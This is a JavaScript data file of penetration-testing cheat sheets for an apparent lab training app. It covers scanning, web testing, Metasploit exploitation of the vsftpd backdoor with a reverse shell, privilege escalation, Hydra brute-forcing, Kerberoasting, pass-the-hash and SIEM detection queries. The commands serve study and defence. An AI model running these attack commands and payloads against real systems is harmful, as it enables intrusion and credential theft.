// Command cheat-sheets — quick step-by-step references (lab/authorized use only).
export const cheatsheets = [
  {
    id: "nmap",
    title: "Nmap — scanning & enumeration",
    icon: "📡",
    sections: [
      { title: "Discovery", commands: ["nmap -sn 192.168.56.0/24            # ping sweep (host discovery)", "nmap -Pn 192.168.56.101             # skip discovery, assume up"] },
      { title: "Port scans", commands: ["nmap -sS -p- 192.168.56.101         # full SYN scan, all 65535 ports", "nmap -sT -p 22,80,443 192.168.56.101 # TCP connect scan, few ports", "nmap --top-ports 1000 192.168.56.101 # most common 1000 ports"] },
      { title: "Fingerprinting", commands: ["nmap -sV -O 192.168.56.101          # service versions + OS guess", "nmap -A 192.168.56.101              # aggressive: OS, versions, traceroute, scripts"] },
      { title: "Scripts & output", commands: ["nmap --script http-title -p 80 192.168.56.102", "nmap --script vuln 192.168.56.101 -oA report   # save normal/xml/gnmap"] },
    ],
  },
  {
    id: "burp",
    title: "Burp Suite — web app testing",
    icon: "🕷️",
    sections: [
      { title: "Setup", commands: ["Proxy → 127.0.0.1:8080; set browser proxy to match", "Install Burp CA cert (http://burp/cert) for HTTPS interception", "Target → Site map to map the app"] },
      { title: "Manual testing", commands: ["Send request to Repeater (Ctrl+R) to iterate payloads", "SQLi test:  admin' OR '1'='1' --", "XSS test:   <img src=x onerror=alert(1)>", "IDOR test:  change ?id=1 → ?id=2 and compare responses"] },
      { title: "Automation", commands: ["Intruder (Ctrl+I): mark §param§, load wordlist, start attack", "Scanner (Pro): active scan in-scope URLs only"] },
    ],
  },
  {
    id: "metasploit",
    title: "Metasploit — exploitation workflow",
    icon: "💥",
    sections: [
      { title: "Workflow", commands: ["msfconsole -q", "search vsftpd                          # find modules", "use exploit/unix/ftp/vsftpd_234_backdoor", "show options                           # required settings", "set RHOSTS 192.168.56.101              # LAB VM ONLY", "set PAYLOAD cmd/unix/reverse", "exploit"] },
      { title: "Sessions & post", commands: ["sessions -l                            # list sessions", "sessions -i 1                          # interact", "sysinfo / getuid / ps / hashdump       # lab post-exploitation"] },
    ],
  },
  {
    id: "wireshark",
    title: "Wireshark — packet analysis",
    icon: "🦈",
    sections: [
      { title: "Capture", commands: ["sudo wireshark  (or)  sudo tcpdump -i eth0 -w lab.pcap", "tshark -r lab.pcap -Y 'http' -T fields -e http.request.full_uri"] },
      { title: "Display filters", commands: ["tcp.flags.syn==1 && tcp.flags.ack==0     # SYN scan signature", "http.request.method == \"POST\"            # form submissions", "dns.qry.name contains \"dvwa\"             # DNS for a host", "tls.handshake.type == 1                    # TLS ClientHello"] },
      { title: "Analysis", commands: ["Right-click TCP packet → Follow → TCP Stream", "Analyze → Expert Information for anomalies", "File → Export Objects → HTTP to extract files"] },
    ],
  },
  {
    id: "linux-privesc",
    title: "Linux privilege escalation",
    icon: "⬆️",
    sections: [
      { title: "Enumerate", commands: ["sudo -l                                  # allowed sudo commands", "find / -perm -4000 -type f 2>/dev/null   # SUID binaries", "cat /etc/crontab; ls -la /etc/cron.*     # cron jobs", "uname -a; cat /etc/os-release            # kernel/OS matching"] },
      { title: "Exploit", commands: ["# check GTFOBins (https://gtfobins.github.io) for the binary you found", "# e.g. SUID nmap: nmap --interactive → !sh", "id                                       # confirm root"] },
    ],
  },
  {
    id: "passwords",
    title: "Password attacks (own hashes / lab logins only)",
    icon: "🔑",
    sections: [
      { title: "Offline (your own hashes)", commands: ["echo -n 'password' | md5sum > myhash.txt", "john --wordlist=/usr/share/wordlists/rockyou.txt myhash.txt", "hashcat -m 0 -a 0 myhash.txt wordlist.txt"] },
      { title: "Online (lab login forms only)", commands: ["hydra -l labuser -P words.txt 192.168.56.101 ssh", "hydra -l admin -P words.txt 192.168.56.102 http-post-form '/login.php:u=^USER^&p=^PASS^:F=incorrect'"] },
    ],
  },
  {
    id: "active-directory",
    title: "Active Directory attacks (lab domain only)",
    icon: "🏰",
    sections: [
      { title: "Enumeration", commands: ["enum4linux -a 192.168.56.10              # lab DC", "ldapsearch -x -H ldap://192.168.56.10 -b 'DC=lab,DC=local' '(objectClass=user)' sAMAccountName", "crackmapexec smb 192.168.56.10 -u guest -p '' --shares   # lab"] },
      { title: "Kerberos roasting", commands: ["GetNPUsers.py lab.local/ -usersfile users.txt -no-pass -dc-ip 192.168.56.10", "GetUserSPNs.py lab.local/svc:Passw0rd -dc-ip 192.168.56.10 -request", "hashcat -m 13100 tgs.txt rockyou.txt     # crack YOUR lab hashes"] },
      { title: "Path finding & lateral movement", commands: ["SharpHound.exe -c All --zipfilename loot.zip   # on lab Windows VM", "# import into BloodHound → 'Shortest Paths to Domain Admins'", "wmiexec.py -hashes :<NTLM> lab.local/admin@192.168.56.10   # lab only"] },
    ],
  },
  {
    id: "siem-splunk",
    title: "Splunk / SIEM detection queries (lab data)",
    icon: "📊",
    sections: [
      { title: "Brute force (Windows)", commands: ["index=windows EventCode=4625 | stats count by src_ip, user | where count > 5", "index=linux 'Failed password' | stats count by src | sort -count | head"] },
      { title: "Backdoor / exploitation", commands: ["index=windows EventCode=4688 Image=*\\\\nc.exe   # netcat execution", "index=network dest_port=6200   # vsftpd backdoor connections (Suricata/Zeek feed)"] },
      { title: "Dashboards & alerts", commands: ["# Save queries as reports → Dashboard panels", "# Alert action: email / webhook / notable event when count > threshold"] },
    ],
  },
  {
    id: "phishing-triage",
    title: "Phishing triage workflow",
    icon: "🎣",
    sections: [
      { title: "Extract & defang IOCs", commands: ["# parse headers: Received chain, SPF/DKIM/DMARC (Authentication-Results)", "grep -oE 'https?://[^ ]+' email.eml | sed 's/http/hxxp/g'   # defang URLs", "grep -oE '[0-9]{1,3}(\\.[0-9]{1,3}){3}' email.eml | sort -u     # IPs"] },
      { title: "Enrich", commands: ["whois suspicious-domain.com", "curl -s 'https://www.virustotal.com/api/v3/urls/<base64-url>' -H 'x-apikey: $VT_KEY'", "curl -s 'https://urlscan.io/api/v1/search/?q=domain:suspicious-domain.com'"] },
      { title: "Verdict & mapping", commands: ["# document: true positive / benign + evidence", "# map to MITRE ATT&CK: T1566 Phishing, T1204 User Execution, T1071 C2"] },
    ],
  },
  {
    id: "osint",
    title: "OSINT workflow (authorized scope only)",
    icon: "🛰️",
    sections: [
      { title: "People & org", commands: ["theHarvester -d example.com -b all -f report.html   # your domain", "shodan search 'org:YourOrg' | head", "# LinkedIn/Maltego for employees — only with authorization"] },
      { title: "Infrastructure", commands: ["subfinder -d example.com -silent > subs.txt", "cat subs.txt | httpx -silent -status-code -title", "nmap -sV --top-ports 100 <live-hosts>   # only in-scope hosts"] },
      { title: "Leaks & exposure", commands: ["# check your own org against public breach data (HaveIBeenPwned API)", "# certificate transparency: crt.sh/?q=%25.example.com"] },
    ],
  },
  {
    id: "forensics-re",
    title: "Forensics & reverse engineering",
    icon: "🧠",
    sections: [
      { title: "Memory", commands: ["vol -f memdump.raw windows.pslist", "vol -f memdump.raw windows.netscan", "vol -f memdump.raw windows.malfind"] },
      { title: "Malware triage", commands: ["sha256sum sample.bin; strings -n 8 sample.bin | grep -iE 'http|mutex'", "r2 -A sample.bin  →  afl (list functions)", "# detonate ONLY in a sandbox VM with no network"] },
      { title: "Network IOCs", commands: ["tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name | sort -u", "tshark -r capture.pcap -Y 'http.request' -T fields -e http.host"] },
    ],
  },
];
